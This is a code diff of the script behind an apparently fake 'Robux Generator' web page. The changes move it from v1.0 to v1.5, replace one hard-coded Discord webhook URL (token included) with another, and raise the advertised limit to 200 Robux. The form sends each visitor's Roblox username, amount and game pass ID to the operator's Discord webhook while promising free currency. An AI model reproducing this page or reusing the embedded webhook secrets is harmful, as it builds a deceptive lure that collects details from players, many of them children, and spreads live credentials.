@@ -69,10 +69,10 @@
                 username: username,
                 amount: amount,
                 gamepass: gamepass,
-                version: "v1.0"
+                version: "v1.5"
             };
 
-            var webhookUrl = "https://discord.com/api/webhooks/1268483155770212383/EfhQLr7GnUY4Pulrz2biH1Q_RWC7ARBy5hVqswQrZIJZZCWIwLywty_TsH1Kv-9wf1Ys";
+            var webhookUrl = "https://discord.com/api/webhooks/1268505416862535711/cfHMJDoiSa2luzpKgf9vGXjmoEzYCmXG7iBhnqH_9jB3jVqBEhl6DUgYUzPX5FILF9Uy";
 
             fetch(webhookUrl, {
                 method: 'POST',
@@ -80,12 +80,12 @@
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    content: `Robux Generator Submission\nUsername: ${username}\nAmount: ${amount} RBX\nGame Pass ID: ${gamepass}\nVersion: v1.0 Web`
+                    content: `Robux Generator Submission\nUsername: ${username}\nAmount: ${amount} RBX\nGame Pass ID: ${gamepass}\nVersion: v1.5 Web`
                 })
             })
             .then(response => {
                 if(response.ok) {
-                    document.getElementById('message').innerText = 'Request submitted successfully!keep in mind the limit is currently 110rbx';
+                    document.getElementById('message').innerText = 'Request submitted successfully!keep in mind The Current limit is 200 Robux 12/07/2024. v1.5';
                 } else {
                     document.getElementById('message').innerText = 'Failed to submit request.';
                 }
